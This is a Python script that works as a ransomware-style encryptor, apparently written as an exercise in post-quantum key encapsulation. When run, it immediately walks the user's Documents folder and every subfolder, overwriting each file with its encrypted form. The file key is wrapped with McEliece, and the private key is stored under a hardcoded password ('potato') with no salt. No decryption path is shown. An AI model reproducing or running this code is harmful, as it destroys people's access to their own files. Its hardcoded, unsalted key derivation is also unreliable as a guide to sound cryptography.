from pqc.kem import mceliece6960119 as eliece
from cryptography.fernet import Fernet
import os
from platformdirs import user_documents_dir
import hashlib
import base64

def encryption(folderpath):
    # 1. Generation of public and private keys
    publicKey, privateKey = eliece.keypair()
    
    # 2. Encapsulation (creation of K1 normal and encapsuled with publicKey)
    K1, encapK1 = eliece.encap(publicKey)
    K1 = base64.urlsafe_b64encode(K1) #Prepare to use it with Fernet
    
    # 3. Creation of K2 (hashing a password)
    password = b"potato"
    salt = b""  # No salt 
    iterations = 100000
    dklen = 32 # dklen stands for desired key length. Fernet uses AES-128, but splits a 256 key in half, one for authentication

    key = hashlib.pbkdf2_hmac('sha256', password, salt, iterations, dklen)
    K2 = base64.urlsafe_b64encode(key)
    
    # 4. Encryption with K2 of private key
    f2 = Fernet(K2)
    privateKey = f2.encrypt(privateKey)
    # 5. Store encrypted private Key and encrypted K1
    file = open("privateKey.bin", "wb")
    file.write(privateKey)  
    file.close()
    
    file = open("encapK1.bin", "wb")
    file.write(encapK1) 
    file.close()  

    # 6. Encrypt target folder
    auxEncryption(K1,folderpath)  
    
def auxEncryption(K1,folderpath):
    # Creation of Fernet object with the generated key
    f = Fernet(K1) 
    # We use os.listdir to do a foreach of its contents
    # If we are looking at a file, we consider it a target, read it and encrypt it where it was
    files = [file for file in os.listdir(folderpath) if not file.startswith('.') and file != 'desktop.ini' and not os.path.isjunction(os.path.join(folderpath, file)) and not os.path.islink(os.path.join(folderpath, file))]
    for filename in files:
        currentPath = os.path.join(folderpath, filename)
        if os.path.isfile(currentPath):
            # Binary reading of a given file
            with open (currentPath, "rb") as file:
                target = file.read()
            # Encryption of read file
            encryptedTarget = f.encrypt(target)
            # Overwrite of read file with its encryption
            with open(currentPath, "wb") as encryptedFile:
                encryptedFile.write(encryptedTarget)
        elif os.path.isdir(currentPath):
            auxEncryption(K1,currentPath) # Recursivity for subfolders
# ENCRYPTION OF FOLDER
folderpath = user_documents_dir()
print(folderpath)
encryption(folderpath)